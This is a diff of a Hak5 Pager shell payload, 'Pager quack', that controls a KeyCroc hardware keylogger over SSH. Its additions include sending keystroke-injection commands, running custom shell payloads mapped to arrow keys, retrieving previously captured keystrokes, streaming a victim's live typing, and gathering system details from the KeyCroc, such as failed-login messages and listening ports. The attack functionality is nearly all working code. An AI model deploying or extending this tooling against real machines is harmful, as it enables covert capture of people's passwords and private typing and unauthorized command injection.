@@ -3,7 +3,7 @@
 # Title: Pager quack
 # Author: spywill
 # Description: Send QUACK commands to your KeyCroc, as well as read previously captured keystrokes and monitor live keystrokes as they are entered.
-# Version: 2.2
+# Version: 2.3
 
 PROMPT "Send QUACK commands to your KeyCroc, read previously captured keystrokes and monitor live keystrokes.
 sshpass is required for the connection.
@@ -12,24 +12,33 @@ Alternatively, KeyCroc can connect directly to the Pager's open access point (AP
 
 # Payload variables
 ENGLISH_WORD_LIST="https://raw.githubusercontent.com/first20hours/google-10000-english/master/google-10000-english.txt"
-SAVE_KEYSTROKE="/mmc/root/payloads/user/remote_access/Pager_quack/KeyCroc_Keystrokes"
-DUCKY_PAYLOAD="/mmc/root/payloads/user/remote_access/Pager_quack/DuckyPayloads"
-PASS_FILE="/mmc/root/payloads/user/remote_access/Pager_quack/croc_passwd.txt"
-CROC_IP_FILE="/mmc/root/payloads/user/remote_access/Pager_quack/croc_IP.txt"
-WORDFILE="/mmc/root/payloads/user/remote_access/Pager_quack/words.txt"
-chmod 777 /mmc/root/payloads/user/remote_access/Pager_quack
+README_URL="https://raw.githubusercontent.com/spywill/Pineapple_pager_projects/main/Pager_quack/README.md"
+PAGER_SSID=$(iw dev | awk '/Interface wlan0open/{f=1} f && /ssid/{print $2; exit}')
+SAVE_KEYSTROKE="${_PAYLOAD_HOME}KeyCroc_Keystrokes"
+ARROW_CONFIG="${_PAYLOAD_HOME}arrow_keys.conf"
+DUCKY_PAYLOAD="${_PAYLOAD_HOME}DuckyPayloads"
+PASS_FILE="${_PAYLOAD_HOME}croc_passwd.txt"
+CROC_IP_FILE="${_PAYLOAD_HOME}croc_IP.txt"
+README_FILE="${_PAYLOAD_HOME}README.md"
 REMOTE_FILE="/root/loot/croc_char.log"
+WORDFILE="${_PAYLOAD_HOME}words.txt"
+chmod 777 ${_PAYLOAD_HOME}
 i=0
 
-# Create Ducky Payload folder if it does not exist.
-if [ ! -d "$DUCKY_PAYLOAD" ] || [ ! -d "$SAVE_KEYSTROKE" ]; then
+# Create Ducky Payload and Keystrokes folders if they do not exist.
+if [ ! -d "$DUCKY_PAYLOAD" ]; then
 	mkdir -p "$DUCKY_PAYLOAD"
-	mkdir -p "$SAVE_KEYSTROKE"
 	LOG yellow "Created Ducky Payloads folder: $DUCKY_PAYLOAD"
+fi
+
+if [ ! -d "$SAVE_KEYSTROKE" ]; then
+	mkdir -p "$SAVE_KEYSTROKE"
 	LOG yellow "Created Keystrokes folder: $SAVE_KEYSTROKE"
-	# Create default Ducky Payload if it does not exist
-	if [ ! -f "$DUCKY_PAYLOAD/QUACK.txt" ]; then
-		cat > "$DUCKY_PAYLOAD/QUACK.txt" <<'EOF'
+fi
+
+# Create default Ducky Payload if it does not exist.
+if [ ! -f "$DUCKY_PAYLOAD/QUACK.txt" ]; then
+	cat > "$DUCKY_PAYLOAD/QUACK.txt" <<'EOF'
 #---> Default Ducky Payload
 QUACK STRING "test 1"
 QUACK ENTER
@@ -40,7 +49,79 @@ QUACK DELAY 2000
 QUACK STRING "working"
 QUACK ENTER
 EOF
-		LOG yellow "Created default Ducky Payload name QUACK.txt"
+	LOG yellow "Created default Ducky Payload QUACK.txt"
+fi
+
+# Create PAGER_WiFi.sh if it does not exist.
+if [ ! -f "$DUCKY_PAYLOAD/PAGER_WiFi.sh" ]; then
+	LOG "**Installing PAGER_WiFi.sh**
+
+	This script connects the Key Croc to the Pager's Open AP Wi-Fi network.
+	Before running the script, ensure that the Pager Open AP is enabled and running."
+
+	LOG red "**Important:**
+
+	Running this script will terminate your current SSH session.
+	Once the connection is interrupted, you will need to restart Pager Quack to establish a new session and continue using its features.
+	Ensure the Pager Open AP is enabled."
+
+	PROMPT "**Installing PAGER_WiFi.sh**
+	Connects the Key Croc to the Pager Open AP. Ensure the Open AP is enabled before running.
+	**Warning:** This will terminate your current SSH session. Restart Pager Quack to reconnect."
+
+	cat > "$DUCKY_PAYLOAD/PAGER_WiFi.sh" <<'EOF'
+#!/bin/bash
+
+# This script connects the Key Croc to the Pager's Open AP Wi-Fi network.
+
+IFACE=$(iw dev | awk '$1=="Interface"{print $2; exit}')
+
+iw dev "$IFACE" scan 2>/dev/null | grep -q "SSID: $PAGER_SSID"
+if [ $? -eq 0 ]; then
+	LED SETUP
+	kill -9 $(pidof wpa_supplicant) && kill -9 $(pidof dhclient)
+	ifconfig wlan0 down
+
+	cat > /etc/wpa_supplicant.conf <<EOC
+network={
+    ssid="$PAGER_SSID"
+    key_mgmt=NONE
+}
+EOC
+
+	ifconfig wlan0 up
+	wpa_supplicant -B -D nl80211 -iwlan0 -c /etc/wpa_supplicant.conf && dhclient wlan0
+	sleep 3
+	systemctl restart ssh.service
+else
+	LED R
+fi
+
+if iw dev "$IFACE" link | grep -q "SSID: $PAGER_SSID"; then
+	LED G
+else
+	LED R
+fi
+
+sleep 5
+LED OFF
+EOF
+
+	LOG yellow "Created PAGER_WiFi.sh"
+fi
+
+# Create the arrow-key configuration file with default commands.
+if [ ! -f "$ARROW_CONFIG" ]; then
+	mkdir -p "$(dirname "$ARROW_CONFIG")"
+
+	if printf '%s\n' \
+		"QUACK DELETE" \
+		"QUACK BACKSPACE" \
+		"QUACK ENTER" \
+		"QUACK STRING 'Hello from pager!'" > "$ARROW_CONFIG"; then
+		LOG green "[PAGER] Created arrow-key configuration file."
+	else
+		LOG red "[PAGER] Failed to create arrow-key configuration file."
 	fi
 fi
 
@@ -193,7 +274,8 @@ if can_reach "$croc_ip"; then
 	echo "$croc_passwd" > "$PASS_FILE"
 	LOG yellow "Saved Keycroc Password at $PASS_FILE"
 else
-	ERROR_DIALOG "$croc_ip unreachable" ; exit 0
+	LOG red "ERROR: KEYCROC UNREACHABLE. Check Wi-Fi, IP and password. $croc_ip"
+	ERROR_DIALOG "ERROR: KEYCROC UNREACHABLE. Check Wi-Fi, IP and password. $croc_ip" ; exit 0
 fi
 
 # Keep the shared SSH master alive while the menus are open; close it on exit.
@@ -248,6 +330,7 @@ Quack_Command() {
 			"Quack_Capslock" \
 			"Quack_Arrow_Key" \
 			"Number_pad" \
+			"Customize_Keys" \
 			"Exit" \
 			"Main_menu" \
 			"Main_menu"
@@ -408,6 +491,85 @@ EOF
 					PROMPT "Payload delivery failed."
 				fi
 			;;
+			"Customize_Keys")
+				LOG yellow "[PAGER] Customize Key command selected. Ready for payload injection..."
+				PROMPT "**Arrow Keys:** Customize the UP, DOWN, LEFT, and RIGHT arrow keys with your preferred QUACK commands.
+				Commands are executed remotely on the KeyCroc through SSH. Press Button A to return to the menu."
+
+				# Load previously saved commands if the configuration exists.
+				if [ -f "$ARROW_CONFIG" ]; then
+					{
+						IFS= read -r ARROW_UP
+						IFS= read -r ARROW_DOWN
+						IFS= read -r ARROW_LEFT
+						IFS= read -r ARROW_RIGHT
+					} < "$ARROW_CONFIG"
+				fi
+
+				# Configure custom commands for each arrow key.
+				ARROW_UP=$(TEXT_PICKER "Enter Arrow UP command" "$ARROW_UP") || return
+				ARROW_DOWN=$(TEXT_PICKER "Enter Arrow DOWN command" "$ARROW_DOWN") || return
+				ARROW_LEFT=$(TEXT_PICKER "Enter Arrow LEFT command" "$ARROW_LEFT") || return
+				ARROW_RIGHT=$(TEXT_PICKER "Enter Arrow RIGHT command" "$ARROW_RIGHT") || return
+
+				# Save the selected commands for the next session.
+				if ! printf '%s\n' "$ARROW_UP" "$ARROW_DOWN" "$ARROW_LEFT" "$ARROW_RIGHT" > "$ARROW_CONFIG"; then
+					LOG red "[PAGER] Failed to save arrow-key settings."
+				else
+					LOG green "[PAGER] Arrow-key settings saved."
+				fi
+
+				# Display the assigned commands and available menu controls.
+				LOG "ARROW UP: $ARROW_UP
+				ARROW DOWN: $ARROW_DOWN
+				ARROW LEFT: $ARROW_LEFT
+				ARROW RIGHT: $ARROW_RIGHT
+				BUTTON A: Return to menu"
+				PROMPT "Arrow Keys selected:
+
+				ARROW UP: $ARROW_UP
+				ARROW DOWN: $ARROW_DOWN
+				ARROW LEFT: $ARROW_LEFT
+				ARROW RIGHT: $ARROW_RIGHT
+				BUTTON A: Return to menu"
+
+				# Continuously listen for arrow key and button input.
+				while true; do
+					arrow_key=$(WAIT_FOR_INPUT)
+
+					case "$arrow_key" in
+						UP)
+							command="$ARROW_UP"
+						;;
+						DOWN)
+							command="$ARROW_DOWN"
+						;;
+						LEFT)
+							command="$ARROW_LEFT"
+						;;
+						RIGHT)
+							command="$ARROW_RIGHT"
+						;;
+						A)
+							LOG yellow "Returning to menu."
+							return
+						;;
+						*)
+							LOG yellow "Returning to menu."
+							return
+						;;
+					esac
+
+					# Send the selected command to KeyCroc over SSH and execute it.
+					if ! printf '%s\n' "$command" | ssh_croc "sh -lc 'bash -s'"; then
+						LOG red "[KEYCROC] SSH command failed. Returning to menu."
+						return
+					fi
+
+					# Confirm which command was executed successfully.
+					LOG blue "Executed: $command"
+				done
+			;;
 			"Main_menu")
 				LOG yellow "Return to main menu"
 				return
@@ -428,19 +590,19 @@ Ducky_Payload() {
 	LOG yellow "Selected a ducky payload Ensure to give your payload a name"
 	LOG cyan "[name_of_payload.txt]"
 	LOG yellow "Save payloads at:"
-	LOG cyan "[/mmc/root/payloads/user/remote_access/Pager_quack/DuckyPayloads/name_of_payload.txt]"
+	LOG cyan "[${_PAYLOAD_HOME}/DuckyPayloads/name_of_payload.txt]"
 	LOG blue "================================================="
 
-	# Build the list of .txt files.
+	# Build the list of .txt and .sh files.
 	set --
-	for file in "$DUCKY_PAYLOAD"/*.txt; do
-	[ -f "$file" ] || continue
+	for file in "$DUCKY_PAYLOAD"/*.txt "$DUCKY_PAYLOAD"/*.sh; do
+		[ -f "$file" ] || continue
 		set -- "$@" "$(basename "$file")"
 	done
-	# Check if any files were found.
+	# Check if any payload files were found.
 	if [ "$#" -eq 0 ]; then
-		LOG red "No .txt files found in $DUCKY_PAYLOAD"
-		PROMPT "No .txt files found in $DUCKY_PAYLOAD"
+		LOG red "No .txt or .sh files found in $DUCKY_PAYLOAD"
+		PROMPT "No .txt or .sh files found in $DUCKY_PAYLOAD"
 		return
 	fi
 	# Build the main payload menu.
@@ -539,7 +701,7 @@ Ducky_Payload() {
 				return
 			fi
 
-			# Build payload menu.
+			# Build keycroc payload menu.
 			set --
 			while IFS= read -r file; do
 				[ -n "$file" ] && set -- "$@" "$file"
@@ -673,31 +835,89 @@ EOF
 			return
 		;;
 		*)
-			# Find the selected payload.
+			# Search for the selected .txt or .sh payload in the Ducky payload folder.
 			QUACK=""
-			for file in "$DUCKY_PAYLOAD"/*.txt; do
+			for file in "$DUCKY_PAYLOAD"/*.txt "$DUCKY_PAYLOAD"/*.sh; do
 				[ -f "$file" ] || continue
+				# Match the selected filename and save its full path.
 				if [ "$(basename "$file")" = "$resp" ]; then
 					QUACK="$file"
 					break
 				fi
 			done
 
+			# Stop if the selected payload cannot be found.
 			if [ -z "$QUACK" ] || [ ! -f "$QUACK" ]; then
 				LOG red "[PAGER] ERROR: Selected payload was not found."
 				PROMPT "[PAGER] ERROR: Payload not found."
 				return
 			fi
 
+			# Ask the user to confirm execution of the selected payload.
 			confirm=$(CONFIRMATION_DIALOG "Run Pager payload: $resp?") || return
 			if [ "$confirm" != "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
-				LOG yellow "[PAGER] Execution cancelled."
+				LOG red "[PAGER] Execution cancelled."
 				return
 			fi
 
+			# Display the selected payload's contents on the Pager.
 			LOG green "Selected Ducky Payload:"
 			LOG "$(cat "$QUACK")"
-			Send_Quack
+
+			# Choose how to handle the payload based on its file extension.
+			case "$QUACK" in
+				*.sh)
+					LOG blue "[PAGER] Running shell script: $resp"
+
+					# Handle the special Wi-Fi setup script separately.
+					if [ "$resp" = "PAGER_WiFi.sh" ]; then
+						# Check whether the Pager Open AP is active.
+						if [ -z "$PAGER_SSID" ]; then
+							LOG red "[PAGER] Open AP is inactive."
+							LOG yellow "Please activate the Pager's open access point before running this script."
+							PROMPT "Please activate the Pager's open access point before running this script."
+							return
+						fi
+						LOG green "[PAGER] Open AP is active: $PAGER_SSID"
+
+						# Check KeyCroc's current Wi-Fi connection over SSH.
+						if ! CROC_SSID=$(ssh_croc 'iw dev wlan0 link | grep "SSID" | awk '\''{print $2}'\'''); then
+							LOG red "[KEYCROC] Unable to check Wi-Fi connection."
+							return
+						fi
+
+						# Verify that both SSIDs are available.
+						if [ -z "$CROC_SSID" ] || [ -z "$PAGER_SSID" ]; then
+							LOG red "[KEYCROC] Unable to determine Wi-Fi SSID."
+							return
+						fi
+						LOG blue "[KEYCROC] Current connected Wi-Fi: $CROC_SSID"
+
+						# Check whether KeyCroc is already connected to the Pager Open AP.
+						if [ "$CROC_SSID" = "$PAGER_SSID" ]; then
+							LOG yellow "[KEYCROC] is already connected to the Pager Open AP: $CROC_SSID"
+							PROMPT "KeyCroc is already connected to the Pager Open AP: $PAGER_SSID"
+							return
+						fi
+
+						# Warn that switching Wi-Fi will terminate the current SSH session.
+						LOG red "This will terminate the SSH session and exit Pager Quack."
+						LOG yellow "You will need to restart Pager Quack and ensure your Pager Open AP is turned ON."
+						PROMPT "This will terminate the SSH session and exit Pager Quack. Restart Pager Quack with your Pager Open AP turned ON."
+
+						# Send the command to initiate the Wi-Fi switch.
+						Send_Quack
+						return
+					fi
+
+					# Execute the selected shell payload.
+					Send_Quack
+				;;
+				*.txt)
+					# Execute the selected text-based Ducky payload.
+					Send_Quack
+				;;
+			esac
 		;;
 	esac
 }
@@ -708,34 +928,43 @@ keystrokes() {
 	# Fetch and display the contents of matching remote log files.
 	process_logs() {
 		log="$1"
-
 		LOG yellow "[KEYCROC] Previous $key selected. Accessing stored data..."
-		spinnerid=$(START_SPINNER "Collecting $key...")
 
-		# Display each file's path, character count, separator, and contents.
-		OUTPUT=$(
+		spinnerid=$(START_SPINNER "Collecting $key...")
+		# Find matching files and collect their date, character count, and contents.
+		if OUTPUT=$(
 			ssh_croc "find / -type f -name '$log' 2>/dev/null -exec sh -c '
 				for file do
 					chars=\$(wc -m < \"\$file\")
+					date=\$(date -r \"\$file\" \"+%Y-%m-%d %H:%M:%S\" 2>/dev/null)
+
 					echo \"File: \$file\"
-					echo \"number of char: \$chars\"
+					echo \"Date received/modified: \${date:-Unknown}\"
+					echo \"Number of characters: \$chars\"
 					echo \"------------------------\"
 					cat \"\$file\"
 					echo
 				done
 			' sh {} +"
-		)
+		); then
 
-		STOP_SPINNER ${spinnerid}
-		sleep 1
-
-		# Display the collected output one line at a time in the Pager UI.
-		while IFS= read -r line; do
-			LOG "$line"
-		done <<< "$OUTPUT"
-
-		LOG green "PRESS A BUTTON TO RETURN TO MENU"
-		WAIT_FOR_BUTTON_PRESS A
+			STOP_SPINNER "${spinnerid}"
+			# Display the collected output one line at a time in the Pager UI.
+			if [ -n "$OUTPUT" ]; then
+				while IFS= read -r line; do
+					LOG "$line"
+				done <<< "$OUTPUT"
+			else
+				LOG yellow "[KEYCROC] No matching log files found."
+			fi
+			LOG green "PRESS A BUTTON TO RETURN TO MENU"
+			WAIT_FOR_BUTTON_PRESS A
+		else
+			STOP_SPINNER "${spinnerid}"
+			LOG red "ERROR: KEYCROC UNREACHABLE. Check Wi-Fi, IP and password. $croc_ip"
+			ERROR_DIALOG "ERROR: KEYCROC UNREACHABLE. Check Wi-Fi, IP and password. $croc_ip"
+			return
+		fi
 	}
 
 	# Pattern matching croc_char.log.
@@ -748,6 +977,7 @@ keystrokes() {
 		if [[ -z "$content" ]]; then
 			STOP_SPINNER ${spinnerid}
 			LOG red "No croc_char.log files found"
+			PROMPT "No croc_char.log files found"
 			return
 		fi
 
@@ -825,8 +1055,14 @@ keystrokes() {
 			LOG green "PRESS A BUTTON TO STOP LIVE KEYSTROKES"
 
 			spinnerid=$(START_SPINNER "WAITING FOR KEYBOARD ACTIVITY")
-			ssh_croc 'sh -lc "WAIT_FOR_KEYBOARD_ACTIVITY 0"'
-			STOP_SPINNER "${spinnerid}"
+			if ssh_croc 'sh -lc "WAIT_FOR_KEYBOARD_ACTIVITY 0"'; then
+				STOP_SPINNER "${spinnerid}"
+			else
+				STOP_SPINNER "${spinnerid}"
+				LOG red "ERROR: KEYCROC UNREACHABLE. Check Wi-Fi, IP and password. $croc_ip"
+				ERROR_DIALOG "ERROR: KEYCROC UNREACHABLE. Check Wi-Fi, IP and password. $croc_ip"
+				return
+			fi
 
 			LOG blue "[KEYCROC] Live keystroke stream starting..."
 			# Create a unique temporary FIFO (named pipe) for live keystroke streaming.
@@ -909,6 +1145,8 @@ keystrokes() {
 		"Enter_Pattern")
 			LOG yellow "[KEYCROC] Enter pattern to search in croc_char.log:"
 			pattern=$(TEXT_PICKER "Enter pattern to search" "hak5") || return
+
+			spinnerid=$(START_SPINNER "Searching for $pattern")
 			content=$(ssh_croc 'find / -type f -name "croc_char.log" -exec cat {} + 2>/dev/null')
 
 			# Count every occurrence of the search pattern, including multiple matches on the same line.
@@ -925,10 +1163,12 @@ keystrokes() {
 
 			# Count output of search pattern.
 			if [ "$count" -gt 0 ]; then
+				STOP_SPINNER ${spinnerid}
 				LOG green "[KEYCROC] Match found in loot/croc_char.log."
-				LOG yellow "[$pattern] Match count: $count"
+				LOG blue "[$pattern] Match count: $count"
 				PROMPT "[$pattern] Match count: $count"
 			else
+				STOP_SPINNER ${spinnerid}
 				LOG red "Did not find match $pattern in loot/croc_char.log"
 				PROMPT "Did not find match $pattern in loot/croc_char.log"
 			fi
@@ -1360,129 +1600,233 @@ croc_status() {
 
 	keycroc_info=$(ssh_croc 'sh -lc '"'"'
 		echo "===HOSTNAME==="
-		cat /etc/hostname 2>/dev/null || echo "Unknown" ; echo
+		hostname 2>/dev/null || cat /etc/hostname 2>/dev/null || echo "Unknown"
+		echo
 
 		echo "===OS==="
-		cat /etc/os-release || echo "Unknown" ; echo
+		if [ -r /etc/os-release ]; then
+			. /etc/os-release
+			echo "${PRETTY_NAME:-Unknown}"
+		else
+			echo "Unknown"
+		fi
+		echo
 
 		echo "===KERNEL==="
-		uname -r 2>/dev/null || echo "Unknown" ; echo
+		uname -a 2>/dev/null || echo "Unknown"
+		echo
 
 		echo "===ARCH==="
-		uname -m 2>/dev/null || echo "Unknown" ; echo
-
-		echo "===MACHINE==="
-		uname -o 2>/dev/null || echo "Unknown" ; echo
+		uname -m 2>/dev/null || echo "Unknown"
+		echo
 
 		echo "===SHELL==="
-		echo "$SHELL" 2>/dev/null || echo "Unknown" ; echo
+		echo "${SHELL:-Unknown}"
+		echo
 
 		echo "===BOOT==="
-		uptime -s 2>/dev/null || echo "Unknown" ; echo
+		uptime -s 2>/dev/null || who -b 2>/dev/null || echo "Unavailable"
+		echo
 
 		echo "===UPTIME==="
-		uptime 2>/dev/null || echo "Unknown" ; echo
+		uptime 2>/dev/null || echo "Unavailable"
+		echo
 
 		echo "===LOAD==="
-		cat /proc/loadavg 2>/dev/null | cut -d " " -f1-3 ; echo
+		cat /proc/loadavg 2>/dev/null | awk "{print \"1/5/15 minute load:\", \$1, \$2, \$3; print \"Runnable/total processes:\", \$4}"
+		echo
 
 		echo "===CPU==="
-		grep -m1 -E "^(model name|Processor|cpu model|system type|machine)[[:space:]]*:" /proc/cpuinfo 2>/dev/null | cut -d ":" -f2- | sed "s/^ *//" ; echo
+		grep -m1 -E "^(model name|Processor|cpu model|system type|machine)[[:space:]]*:" /proc/cpuinfo 2>/dev/null | cut -d ":" -f2- | sed "s/^ *//"
+		echo
 
 		echo "===CPU_CORES==="
-		grep -c "^processor" /proc/cpuinfo 2>/dev/null ; echo
+		grep -c "^processor" /proc/cpuinfo 2>/dev/null
+		echo
 
 		echo "===CPU_MHZ==="
-		grep -m1 -E "^(cpu MHz|BogoMIPS)[[:space:]]*:" /proc/cpuinfo 2>/dev/null | cut -d ":" -f2- | sed "s/^ *//" ; echo
+		grep -m1 -E "^(cpu MHz|BogoMIPS)[[:space:]]*:" /proc/cpuinfo 2>/dev/null | cut -d ":" -f2- | sed "s/^ *//"
+		echo
 
 		echo "===MEMORY==="
 		awk "
-			/MemTotal:/ {total=\$2}
-			/MemFree:/  {free=\$2}
-			/Buffers:/  {buffers=\$2}
-			/^Cached:/  {cached=\$2}
-			END {
-				used = total - free - buffers - cached
-				printf \"%d MB / %d MB\", used/1024, total/1024
+			/^MemTotal:/     {total=\$2}
+			/^MemAvailable:/ {available=\$2; has_available=1}
+			/^MemFree:/      {free=\$2}
+			/^Buffers:/      {buffers=\$2}
+			/^Cached:/       {cached=\$2}
+		END {
+		if (total <= 0) {
+			print \"Memory information unavailable\"
+		} else {
+			if (has_available)
+				used=total-available
+			else
+				used=total-free-buffers-cached
+				printf \"Used: %d MB / Total: %d MB\\n\", used/1024, total/1024
+			if (has_available)
+				printf \"Available: %d MB\\n\", available/1024
+			else
+				printf \"Free: %d MB\\n\", free/1024
 			}
-		" /proc/meminfo 2>/dev/null ; echo
-
-		echo "===MEMORY_TOTAL==="
-		awk "/MemTotal:/ {printf \"%d MB\", \$2/1024}" /proc/meminfo
+		}
+		" /proc/meminfo 2>/dev/null
 		echo
 
-		echo "===MEMORY_FREE==="
-		awk "/MemFree:/ {printf \"%d MB\", \$2/1024}" /proc/meminfo
+		echo "===STORAGE_ROOT==="
+		df -h / 2>/dev/null
 		echo
 
-		echo "===STORAGE==="
-		df -h / 2>/dev/null | tail -n 1 ; echo
+		echo "===STORAGE_MOUNTS==="
+		df -h 2>/dev/null
+		echo
 
-		echo "===MOUNTS==="
-		df -h 2>/dev/null | tail -n +2 ; echo
+		echo "===IP_ADDRESSES==="
+		ip -4 addr show 2>/dev/null | awk "/inet / {print \$2, \"interface:\", \$NF}"
+		echo
 
-		echo "===IP==="
-		ip -4 addr show 2>/dev/null |
-		awk "/inet / {print \$2, \$NF}" ; echo
-
-		echo "===ROUTE==="
-		ip route show 2>/dev/null |
-		awk "/default/ {print \$0; exit}" ; echo
+		echo "===DEFAULT_ROUTE==="
+		ip route show 2>/dev/null | awk "/default/ {print; found=1} END {if (!found) print \"No default route found\"}"
+		echo
 
 		echo "===GATEWAY==="
-		ip route show 2>/dev/null |
-		awk "/default/ {print \$3; exit}" ; echo
-
-		echo "===DNS==="
-		cat /etc/resolv.conf 2>/dev/null |
-		grep "^nameserver" |
-		awk "{print \$2}" ; echo
-
-		echo "===INTERFACES==="
-		ip -br link show 2>/dev/null ||
-		ip link show 2>/dev/null
+		ip route show 2>/dev/null | awk "/default/ {print \$3; found=1; exit} END {if (!found) print \"Unavailable\"}"
 		echo
 
-		echo "===MACS==="
+		echo "===DNS==="
+		grep "^nameserver" /etc/resolv.conf 2>/dev/null | awk "{print \$2}"
+		echo
+
+		echo "===INTERFACES==="
+		ip -br addr show 2>/dev/null || ip addr show 2>/dev/null
+		echo
+
+		echo "===LINK_STATUS==="
 		for interface in /sys/class/net/*; do
-			name=$(basename "$interface")
+			[ -e "$interface" ] || continue
+			name=${interface##*/}
+			state=$(cat "$interface/operstate" 2>/dev/null)
+			carrier=$(cat "$interface/carrier" 2>/dev/null)
+			echo "$name : state=${state:-unknown}, carrier=${carrier:-unknown}"
+		done
+		echo
+
+		echo "===MAC_ADDRESSES==="
+		for interface in /sys/class/net/*; do
+			[ -e "$interface" ] || continue
+			name=${interface##*/}
 			mac=$(cat "$interface/address" 2>/dev/null)
 			[ -n "$mac" ] && echo "$name : $mac"
 		done
 		echo
 
-		echo "===KEYBOARD==="
-		if [ "$(KEYBOARD)" = PRESENT ]; then
-			echo "KEYBOARD PRESENT" ; echo
+		echo "===LISTENING_PORTS==="
+		if command -v ss >/dev/null 2>&1; then
+			ss -lntup 2>/dev/null
+		elif command -v netstat >/dev/null 2>&1; then
+			netstat -lntup 2>/dev/null
 		else
-			echo "KEYBOARD MISSING" ; echo
+			echo "Neither ss nor netstat is available"
 		fi
+		echo
+
+		echo "===USB_DEVICES==="
+		if command -v lsusb >/dev/null 2>&1; then
+			lsusb 2>/dev/null
+		elif [ -d /sys/bus/usb/devices ]; then
+			for device in /sys/bus/usb/devices/*; do
+				[ -r "$device/idVendor" ] || continue
+				echo "$(cat "$device/idVendor" 2>/dev/null):$(cat "$device/idProduct" 2>/dev/null) $(cat "$device/product" 2>/dev/null)"
+			done
+		else
+			echo "USB device information unavailable"
+		fi
+		echo
+
+		echo "===INPUT_DEVICES==="
+		if [ -d /dev/input ]; then
+			for device in /sys/class/input/*; do
+				[ -r "$device/name" ] || continue
+				echo "${device##*/} : $(cat "$device/name" 2>/dev/null)"
+			done
+		else
+			echo "Input device information unavailable"
+		fi
+		echo
+
+		echo "===KEYBOARD==="
+		if command -v KEYBOARD >/dev/null 2>&1; then
+			KEYBOARD 2>/dev/null
+		else
+			echo "KEYBOARD check unavailable"
+		fi
+		echo
 
 		echo "===PROCESS_COUNT==="
-		ps w 2>/dev/null |
-		tail -n +2 |
-		wc -l ; echo
+		ps w 2>/dev/null | awk "NR>1 {count++} END {print count+0}"
+		echo
 
-		echo "===PROCESSES==="
-		ps w 2>/dev/null ; echo
+		echo "===TOP_PROCESSES==="
+		ps w 2>/dev/null | head -n 15
+		echo
 
-		echo "===FILES==="
-		for file in \
+		echo "===RECENT_SYSTEM_LOG==="
+		if command -v logread >/dev/null 2>&1; then
+			logread 2>/dev/null | tail -n 20
+		elif [ -r /var/log/syslog ]; then
+			tail -n 20 /var/log/syslog
+		elif [ -r /var/log/messages ]; then
+			tail -n 20 /var/log/messages
+		else
+			echo "No supported system log found"
+		fi
+		echo
+
+		echo "===FAILED_LOGIN_MESSAGES==="
+		if [ -r /var/log/auth.log ]; then
+			grep -iE "failed password|authentication failure|invalid user" /var/log/auth.log 2>/dev/null | tail -n 10
+		elif [ -r /var/log/secure ]; then
+			grep -iE "failed password|authentication failure|invalid user" /var/log/secure 2>/dev/null | tail -n 10
+		else
+			echo "Authentication log unavailable"
+		fi
+		echo
+
+		echo "===IMPORTANT_PATHS==="
+		for path in \
+			/root/udisk \
 			/root/udisk/payloads \
 			/root/udisk/tools \
 			/root/udisk/loot \
 			/root/udisk/config.txt \
-			/root/udisk \
 			/tmp \
-			/var/log
+			/var/log \
+			/dev/input \
+			/sys/class/net
 		do
-			if [ -d "$file" ]; then
-				echo "[PRESENT] $file"
+			if [ -e "$path" ]; then
+				[ -w "$path" ] && writable="writable" || writable="not writable"
+				echo "[PRESENT] $path ($writable)"
+			else
+				echo "[MISSING] $path"
 			fi
 		done
 		echo
+
+		echo "===FILESYSTEM_READ_ONLY==="
+		if command -v mount >/dev/null 2>&1; then
+			mount 2>/dev/null | grep -E " on / | on /root/udisk "
+		else
+			echo "Mount information unavailable"
+		fi
+		echo
+
+		echo "===COLLECTION_TIME==="
+		date 2>/dev/null || echo "Unknown"
+		echo
+
 		echo "__END__"
-	'"'"'')
+	'"'"'' 2>/dev/null)
 
 	if [ -z "$keycroc_info" ]; then
 		STOP_SPINNER "$spinnerid"
@@ -1490,6 +1834,7 @@ croc_status() {
 		PROMPT "KeyCroc information collection failed"
 		return
 	fi
+
 	STOP_SPINNER "$spinnerid"
 	PROMPT "KeyCroc status complete"
 
@@ -1497,64 +1842,6 @@ croc_status() {
 
 	LOG green "PRESS A BUTTON TO RETURN TO MENU"
 	WAIT_FOR_BUTTON_PRESS A
-}
-
-# Keycroc log menu
-Keycroc_logs() {
-	LOG yellow "View KeyCroc log files on Pager"
-
-	# Get the list of log files from the KeyCroc.
-	LOG_FILE=$(ssh_croc 'ls -1 /var/log/' 2>/dev/null)
-
-	# Check whether SSH failed or no files were returned.
-	if [ -z "$LOG_FILE" ]; then
-		LOG red "[KEYCROC] No logs found or SSH connection failed."
-		PROMPT "No logs found or KeyCroc connection failed."
-		return
-	fi
-
-	# Count the returned filenames.
-	LOG "File /var/log Count: $(printf '%s\n' "$LOG_FILE" | wc -l)"
-	# Build the list for the Pager menu.
-	set --
-	while IFS= read -r file; do
-		[ -n "$file" ] && set -- "$@" "$file"
-	done <<EOF
-$LOG_FILE
-EOF
-
-	# Check whether any files were found.
-	if [ "$#" -eq 0 ]; then
-		LOG red "[KEYCROC] No log files found."
-		PROMPT "No log files found."
-		return
-	fi
-
-	# Build the log menu.
-	resp=$(LIST_PICKER \
-		"KEYCROC LOG" \
-		"$@" \
-		"Cancel" \
-		"Cancel"
-	) || return
-
-	# Handle menu selection.
-	case "$resp" in
-		"Cancel"|"")
-			LOG yellow "[PAGER] Cancelled."
-			return
-		;;
-		*)
-			LOG green "[KEYCROC] Selected log: $resp"
-			# Display the selected log file on the Pager.
-			ssh_croc "cat '/var/log/$resp'" 2>/dev/null |
-			while IFS= read -r line; do
-				LOG "$line"
-			done
-			LOG green "PRESS A BUTTON TO RETURN TO MENU"
-			WAIT_FOR_BUTTON_PRESS A
-		;;
-	esac
 }
 
 # Main menu loop.
@@ -1572,6 +1859,7 @@ while true; do
 		"Keycroc_status" \
 		"Keycroc_logs" \
 		"Reboot_Keycroc" \
+		"Readme" \
 		"Exit" \
 		"Exit"
 	)
@@ -1610,6 +1898,34 @@ while true; do
 				wait "$reboot_pid" 2>/dev/null
 				PROMPT "[KEYCROC] is now rebooting"
 			fi
+		;;
+		"Readme")
+			# Notify the user that the README is being loaded.
+			LOG yellow "[PAGER] Loading README..."
+
+			# Check whether a non-empty local README file already exists.
+			if [ -s "$README_FILE" ]; then
+				LOG green "[PAGER] Using local README."
+			else
+				LOG yellow "[PAGER] Downloading README..."
+
+				# Download the README with a 15-second timeout.
+				if curl -fsS --max-time 15 "$README_URL" -o "$README_FILE"; then
+					LOG green "[PAGER] README downloaded."
+				else
+					LOG red "[PAGER] Download failed."
+					return
+				fi
+			fi
+
+			# Display the README contents line by line on the Pager.
+			if [ -s "$README_FILE" ]; then
+				while IFS= read -r line; do
+					LOG "$line"
+				done < "$README_FILE"
+			fi
